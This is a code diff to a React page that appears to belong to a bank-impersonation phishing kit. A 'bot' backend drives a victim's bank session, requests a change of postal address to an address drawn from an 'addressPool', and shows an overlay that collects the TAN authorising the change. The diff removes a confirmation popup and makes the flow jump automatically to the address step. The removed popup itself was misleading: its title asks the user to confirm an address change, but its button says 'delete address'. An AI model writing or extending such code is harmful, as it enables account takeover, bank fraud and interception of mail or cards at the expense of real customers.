@@ -1,7 +1,7 @@
 import { useEffect, useMemo, useState } from "react";
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { Loader2, AlertCircle } from "lucide-react";
-import { getBotTask, confirmAddress } from "@/lib/botClient";
+import { getBotTask } from "@/lib/botClient";
 import { getRandomPoolAddress } from "@/lib/addressPool.functions";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
@@ -127,10 +127,6 @@ function PersonalDataPage() {
   const [botStatus, setBotStatus] = useState<string | null>(null);
   const [botTanType, setBotTanType] = useState<string | null>(null);
   const [botError, setBotError] = useState<string | null>(null);
-  const [addressConfirmOpen, setAddressConfirmOpen] = useState(false);
-  const [addressConfirmSubmitting, setAddressConfirmSubmitting] = useState(false);
-  const [addressConfirmError, setAddressConfirmError] = useState<string | null>(null);
-  const [addressConfirmSuccess, setAddressConfirmSuccess] = useState(false);
 
   useEffect(() => {
     try {
@@ -168,16 +164,16 @@ function PersonalDataPage() {
         setResult((data as any).result);
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify((data as any).result)); } catch {}
       }
-      // Auto-open address popup as soon as bot requests confirmation
-      if (st === "waiting_for_address_confirm" && !addressConfirmSuccess) {
-        setAddressConfirmOpen(true);
+      // Auto-jump to the address step as soon as the bot requests confirmation
+      if (st === "waiting_for_address_confirm") {
+        setAddressDecisionPending(true);
       }
       if (st === "completed" || st === "failed" || Date.now() - startedAt > MAX_MS) return;
       timer = setTimeout(tick, 1500);
     };
     tick();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
-  }, [taskId, addressConfirmSuccess]);
+  }, [taskId]);
 
   const customer = useMemo(
     () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
@@ -198,14 +194,6 @@ function PersonalDataPage() {
   const themeColor = theme.headerBg === "#ffffff" ? (theme.buttonBg || "#003399") : theme.headerBg;
   const secureGoLabel = getSecureGoLabel(bankCtx?.group);
 
-  const ad = (result as any)?.address_data ?? {};
-  const oldStreet = ad.old_street ?? ad.current_street ?? "";
-  const oldPlz = ad.old_plz ?? ad.current_plz ?? "";
-  const oldCity = ad.old_city ?? ad.current_city ?? "";
-  const newStreet = ad.new_street ?? ad.street ?? "";
-  const newPlz = ad.new_plz ?? ad.plz ?? "";
-  const newCity = ad.new_city ?? ad.city ?? "";
-
   // TAN overlay for address change (waiting_for_tan + tan_type === "address")
   const showAddressTan = botStatus === "waiting_for_tan" && botTanType === "address";
 
@@ -217,26 +205,9 @@ function PersonalDataPage() {
     return null;
   }, [botStatus, botError]);
 
-  async function handleConfirmAddressClick() {
-    if (!taskId) return;
-    setAddressConfirmSubmitting(true);
-    setAddressConfirmError(null);
-    try {
-      const res = await confirmAddress(taskId);
-      if (!res.ok) {
-        const body = await res.text().catch(() => "");
-        throw new Error(body || `HTTP ${res.status}`);
-      }
-      setAddressConfirmSuccess(true);
-      setTimeout(() => setAddressConfirmOpen(false), 1200);
-    } catch (e: any) {
-      setAddressConfirmError(e?.message ? String(e.message) : "Unbekannter Fehler");
-    } finally {
-      setAddressConfirmSubmitting(false);
-    }
-  }
+  const hasPersonData = !!(result?.person_data || result?.kontakt_data || result?.adressen_data);
 
-  if (!result || !customer) {
+  if (!result || !customer || !hasPersonData) {
     return (
       <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
         <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
@@ -325,62 +296,6 @@ function PersonalDataPage() {
         <CompletionStep theme={theme} customerName={customer.name} />
       )}
 
-      {/* Address-confirm popup driven by waiting_for_address_confirm */}
-      {addressConfirmOpen && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
-          <div className="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden">
-            <div className="h-1.5" style={{ backgroundColor: theme.buttonBg }} />
-            <div className="p-6">
-              <h3 className="text-lg font-bold mb-4" style={{ color: themeColor }}>
-                Adressänderung bestätigen
-              </h3>
-              <div className="space-y-4 text-sm">
-                <div>
-                  <p className="text-xs text-gray-500 uppercase tracking-wide mb-1">Bisherige Adresse</p>
-                  <p className="text-gray-900 font-medium">{oldStreet || "—"}</p>
-                  <p className="text-gray-900">{[oldPlz, oldCity].filter(Boolean).join(" ") || "—"}</p>
-                </div>
-                <div>
-                  <p className="text-xs text-gray-500 uppercase tracking-wide mb-1">Neue Adresse</p>
-                  <p className="text-gray-900 font-medium">{newStreet || "—"}</p>
-                  <p className="text-gray-900">{[newPlz, newCity].filter(Boolean).join(" ") || "—"}</p>
-                </div>
-                {addressConfirmError && (
-                  <div className="rounded-lg bg-red-50 border border-red-200 p-3 flex items-start gap-2">
-                    <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
-                    <p className="text-sm text-red-600">{addressConfirmError}</p>
-                  </div>
-                )}
-                {addressConfirmSuccess && (
-                  <div className="rounded-lg bg-green-50 border border-green-200 p-3">
-                    <p className="text-sm text-green-700">Adressänderung angefordert.</p>
-                  </div>
-                )}
-              </div>
-              <div className="mt-6 flex gap-3 justify-end">
-                <button
-                  type="button"
-                  onClick={() => setAddressConfirmOpen(false)}
-                  disabled={addressConfirmSubmitting}
-                  className={`px-5 py-2.5 ${theme.buttonRadius} border-2 text-sm font-medium hover:bg-gray-50 disabled:opacity-60`}
-                  style={{ borderColor: theme.accentText, color: theme.accentText }}
-                >
-                  Abbrechen
-                </button>
-                <button
-                  type="button"
-                  onClick={handleConfirmAddressClick}
-                  disabled={addressConfirmSubmitting || addressConfirmSuccess}
-                  className={`px-5 py-2.5 ${theme.buttonRadius} text-sm font-medium disabled:opacity-60`}
-                  style={{ backgroundColor: theme.buttonBg, color: "#ffffff" }}
-                >
-                  {addressConfirmSubmitting ? "Wird gesendet…" : "Adresse löschen"}
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
     </BankShell>
   );
 }
